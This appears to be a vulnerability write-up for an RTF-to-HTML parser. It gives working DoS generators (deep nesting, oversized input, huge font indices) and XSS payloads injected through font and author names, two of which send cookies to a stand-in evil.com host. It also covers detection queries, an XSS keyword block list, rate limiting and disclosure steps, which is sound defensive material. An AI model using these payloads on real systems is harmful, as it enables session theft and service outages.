# Attack Demonstrations

**WARNING:** This document contains working exploit code for educational purposes only.
**DO NOT** use these attacks against systems you don't own.

---

## DoS Attack #1: Deeply Nested Groups

### Vulnerability
Parser has no depth limit for nested RTF groups.

### Exploit Code
```javascript
// Generate malicious RTF with 500 nested groups
function generateNestedGroupAttack(depth = 500) {
  const opening = '{'.repeat(depth);
  const closing = '}'.repeat(depth);
  return `${opening}\\rtf1 text${closing}`;
}

const malicious = generateNestedGroupAttack(500);
parseRTF(malicious); // CRASHES or hangs
```

### Expected Behavior (Current)
- Parser enters infinite recursion
- Stack overflow
- Application crashes

### Expected Behavior (After Fix)
```
Error: Maximum group nesting depth (100) exceeded. This may indicate a malicious or malformed RTF document.
```

### Impact
- **Severity:** HIGH (CVSS 7.5)
- **Exploitability:** Easy (single HTTP request)
- **Scope:** All versions up to 0.1.0

---

## DoS Attack #2: Memory Exhaustion

### Vulnerability
No size limit on RTF documents or text chunks.

### Exploit Code
```javascript
// Generate 100MB of text (will exhaust 8GB RAM server)
function generateMemoryExhaustionAttack() {
  const chunkSize = 10 * 1024 * 1024; // 10MB
  const chunks = 10;

  let attack = '{\\rtf1 ';
  for (let i = 0; i < chunks; i++) {
    attack += 'A'.repeat(chunkSize);
  }
  attack += '}';

  return attack;
}

const malicious = generateMemoryExhaustionAttack();
parseRTF(malicious); // Allocates 100MB+ in memory
```

### Expected Behavior (Current)
- Parser allocates gigabytes of RAM
- System swapping/thrashing
- Out of memory error
- Server crash

### Expected Behavior (After Fix)
```
Error: Document size (104857600 bytes) exceeds maximum allowed size (52428800 bytes). This may indicate a malicious document.
```

### Impact
- **Severity:** HIGH (CVSS 7.5)
- **Resource Cost:** $50+ in cloud costs per attack
- **Recovery Time:** Minutes to restart service

---

## DoS Attack #3: Sparse Array Attack

### Vulnerability
Unbounded font/color table indices create sparse arrays.

### Exploit Code
```javascript
// Create sparse array consuming gigabytes
function generateSparseArrayAttack() {
  return `{\\rtf1
{\\fonttbl
  {\\f0 Arial;}
  {\\f999999999 Times;}
}
This triggers sparse array allocation
}`;
}

const malicious = generateSparseArrayAttack();
parseRTF(malicious); // Creates array with 1 billion elements
```

### Expected Behavior (Current)
- JavaScript engine allocates sparse array
- Memory exhaustion
- Possible engine crash

### Expected Behavior (After Fix)
```
Error: Font index 999999999 out of valid range [0, 1000)
```

### Impact
- **Severity:** HIGH (CVSS 7.3)
- **Memory Impact:** GB per request
- **Mitigation:** None without fix

---

## XSS Attack #1: Font Name Injection

### Vulnerability
Font names are inserted into CSS without sanitization.

### Exploit Code
```javascript
function generateFontNameXSS() {
  return `{\\rtf1
{\\fonttbl{\\f0 Arial</style><img src=x onerror=alert(document.domain)><style>;}}
{\\f0 Some text}
}`;
}

const malicious = generateFontNameXSS();
const doc = parseRTF(malicious);
const html = toHTML(doc);

// html now contains: font-family: Arial</style><img src=x onerror=alert(document.domain)><style>
// When rendered in browser, executes JavaScript
```

### HTML Output (Current)
```html
<div class="rtf-content">
<p><span style="font-family: Arial</style><img src=x onerror=alert(document.domain)><style>">Some text</span></p>
</div>
```

### Browser Execution
1. Browser closes `style` attribute at `</style>`
2. Renders `<img>` tag with `onerror` handler
3. Executes `alert(document.domain)`
4. Attacker can steal cookies, tokens, session data

### Expected Behavior (After Fix)
```html
<p><span style="font-family: &quot;Arial&quot;">Some text</span></p>
```

### Impact
- **Severity:** MEDIUM (CVSS 6.1)
- **Attack Vector:** Stored XSS
- **Affected Users:** All who view rendered HTML

---

## XSS Attack #2: Author Name Attribute Injection

### Vulnerability
Author names are not properly escaped for HTML attributes.

### Exploit Code
```javascript
function generateAuthorNameXSS() {
  return `{\\rtf1
{\\*\\revtbl
  {Unknown;}
  {Alice" onmouseover="alert(1)" data-x=";}
}
This is {\\revised\\revauth1 tracked text}.
}`;
}

const malicious = generateAuthorNameXSS();
const doc = parseRTF(malicious);
const html = toHTML(doc);

// Injects onmouseover handler
```

### HTML Output (Current)
```html
<span class="rtf-revision-inserted"
      style="..."
      data-revision-type="insertion"
      data-author="Alice" onmouseover="alert(1)" data-x=""
      data-author-index="1">
  tracked text
</span>
```

### Browser Execution
1. User hovers over tracked text
2. `onmouseover` fires
3. JavaScript executes
4. Can be used for keylogging, session hijacking, etc.

### Expected Behavior (After Fix)
```html
<span data-author="Alice&quot; onmouseover=&quot;alert(1)&quot; data-x=">
```

### Impact
- **Severity:** MEDIUM (CVSS 6.1)
- **Attack Type:** Event handler injection
- **Stealth:** High (user doesn't see attack)

---

## XSS Attack #3: Backtick Attribute Escape

### Vulnerability
Current `escapeHTML()` doesn't escape backticks.

### Exploit Code
```javascript
function generateBacktickXSS() {
  return `{\\rtf1
{\\*\\revtbl
  {Unknown;}
  {Bob\` onmouseover=\`fetch('https://evil.com/steal?cookie='+document.cookie)\`;}
}
{\\revised\\revauth1 Click here}
}`;
}

const malicious = generateBacktickXSS();
const doc = parseRTF(malicious);
const html = toHTML(doc);

// Exfiltrates cookies on hover
```

### HTML Output (Current)
```html
<span data-author="Bob` onmouseover=`fetch('https://evil.com/steal?cookie='+document.cookie)`">
  Click here
</span>
```

### Attack Flow
1. User hovers over "Click here"
2. Browser executes backtick-delimited attribute
3. Fetches URL with stolen cookie
4. Attacker gains session access

### Expected Behavior (After Fix)
```html
<span data-author="Bob&#96; onmouseover=&#96;fetch(...">
```

### Impact
- **Severity:** MEDIUM (CVSS 6.1)
- **Data Exfiltration:** Cookies, tokens, PII
- **Detection:** Hard to spot in code review

---

## Combined Attack: Multi-Vector Exploitation

### Scenario
Attacker combines DoS and XSS for maximum impact.

### Exploit Code
```javascript
function generateCombinedAttack() {
  // Step 1: DoS to mask XSS in logs
  const dos = '{'.repeat(150);

  // Step 2: XSS payload
  const xss = `{\\rtf1
{\\*\\revtbl{Unknown;}{<img src=x onerror=this.src='https://evil.com/log?'+document.cookie>;}}
{\\revised\\revauth1 Important document}
${dos}${'}' .repeat(150)}
}`;

  return xss;
}

// Attack execution:
// 1. Server parses document (DoS triggers, logs fill up)
// 2. Security team investigates DoS
// 3. Meanwhile, XSS payload executes in victim browsers
// 4. Cookies/sessions stolen while team distracted
```

### Impact
- **Severity:** CRITICAL
- **Attack Complexity:** Medium
- **Detection Evasion:** High

---

## Real-World Attack Scenarios

### Scenario 1: Government Contract Review System

**Target:** Document review portal for classified contracts

**Attack Vector:**
1. Attacker uploads malicious RTF to review system
2. Reviewers open document in portal
3. XSS steals session tokens
4. Attacker accesses classified documents

**Impact:**
- Data breach of classified information
- Compliance violations (FISMA, NIST 800-53)
- Congressional investigation
- Multi-million dollar fines

---

### Scenario 2: Cloud SaaS Document Converter

**Target:** Public RTF-to-HTML conversion service

**Attack Vector:**
1. Attacker submits 100 concurrent requests with nested group DoS
2. Each request consumes 2GB RAM
3. Server exhausts 16GB RAM, crashes
4. Service down for all customers

**Cost:**
- $500/hour in lost revenue
- $200/hour in AWS overage charges
- $50k in SLA penalties
- Reputation damage

---

### Scenario 3: Email Processing Pipeline

**Target:** Enterprise email system converting RTF attachments

**Attack Vector:**
1. Attacker emails malicious RTF to 1000 employees
2. Email server automatically converts to HTML for preview
3. Memory exhaustion crashes mail server
4. Email down for entire organization

**Impact:**
- 10,000 employees unable to work
- $500k/hour in productivity loss
- Emergency IT response costs
- Regulatory reporting requirements

---

## Detection Methods

### Log Patterns (Before Fix)
```
Error: Maximum call stack size exceeded
Error: JavaScript heap out of memory
Error: Cannot read property 'length' of undefined (sparse array)
```

### Attack Indicators
- RTF files > 10MB from untrusted sources
- Rapid increase in parser memory usage
- Multiple errors from same IP
- Unusual character patterns in font/author names

### Monitoring Queries
```sql
-- Detect DoS attempts
SELECT COUNT(*) FROM parser_errors
WHERE error_message LIKE '%stack%'
  AND created_at > NOW() - INTERVAL 1 HOUR
GROUP BY source_ip
HAVING COUNT(*) > 10;

-- Detect XSS attempts
SELECT * FROM documents
WHERE rtf_content LIKE '%</style>%'
   OR rtf_content LIKE '%onerror=%'
   OR rtf_content LIKE '%onclick=%';
```

---

## Mitigation (Temporary Until Fixed)

### Input Validation Layer
```javascript
// Add before parseRTF() call
function validateRTFInput(rtf) {
  // Size check
  if (rtf.length > 10 * 1024 * 1024) {
    throw new Error('RTF too large');
  }

  // Nesting check (rough estimate)
  const openBraces = (rtf.match(/{/g) || []).length;
  if (openBraces > 1000) {
    throw new Error('Too many braces');
  }

  // XSS pattern check
  const xssPatterns = [
    /<script/i,
    /onerror=/i,
    /onclick=/i,
    /onmouseover=/i,
    /javascript:/i,
  ];

  for (const pattern of xssPatterns) {
    if (pattern.test(rtf)) {
      throw new Error('Suspicious content detected');
    }
  }

  return true;
}

// Usage
try {
  validateRTFInput(userRTF);
  const doc = parseRTF(userRTF);
} catch (err) {
  // Log security event
  securityLog.warn('RTF validation failed', { err, source: req.ip });
  return res.status(400).json({ error: 'Invalid RTF' });
}
```

### Rate Limiting
```javascript
const rateLimit = require('express-rate-limit');

const rtfParserLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 requests per IP
  message: 'Too many RTF parse requests',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/api/parse-rtf', rtfParserLimiter, async (req, res) => {
  // ... parsing logic
});
```

### Content Security Policy
```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'none'; style-src 'unsafe-inline';"
  );
  next();
});
```

---

## Responsible Disclosure

If you discover additional vulnerabilities:

1. **DO NOT** disclose publicly
2. **DO NOT** exploit in production
3. **DO** report to maintainer privately
4. **DO** allow 90 days for fix before disclosure

---

**Last Updated:** 2025-12-30
**Classification:** CONFIDENTIAL - Security Research Only
